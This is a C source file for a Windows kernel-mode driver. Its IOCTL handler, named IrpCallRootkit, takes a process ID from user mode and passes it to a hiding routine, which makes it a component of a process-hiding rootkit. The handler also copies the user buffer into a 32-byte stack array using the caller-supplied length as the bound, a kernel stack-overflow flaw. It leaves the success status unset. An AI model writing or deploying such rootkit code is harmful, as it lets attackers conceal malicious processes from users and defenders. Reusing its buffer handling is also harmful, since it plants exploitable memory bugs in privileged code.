#include "Driver.h"

NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP IrpMessage) {

	UNREFERENCED_PARAMETER(DeviceObject);

	IrpMessage->IoStatus.Status = STATUS_SUCCESS;
	IrpMessage->IoStatus.Information = 0;

	IoCompleteRequest(IrpMessage, IO_NO_INCREMENT);


	return STATUS_SUCCESS;
}

NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {


	UNREFERENCED_PARAMETER(DeviceObject);

	ULONG inBufferLength, outBufferLength, requestCode;

	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	inBufferLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufferLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	requestCode = irpSp->Parameters.DeviceIoControl.IoControlCode;

	PCHAR inBuf = Irp->AssociatedIrp.SystemBuffer;

	if (requestCode != IRP_ROOTKIT_CODE) {
		Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
	}


	Irp->IoStatus.Information = inBufferLength;

	char pid[32];
	strcpy_s(pid, inBufferLength, inBuf);

	hidep(atoi(pid));

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return Irp->IoStatus.Status;
}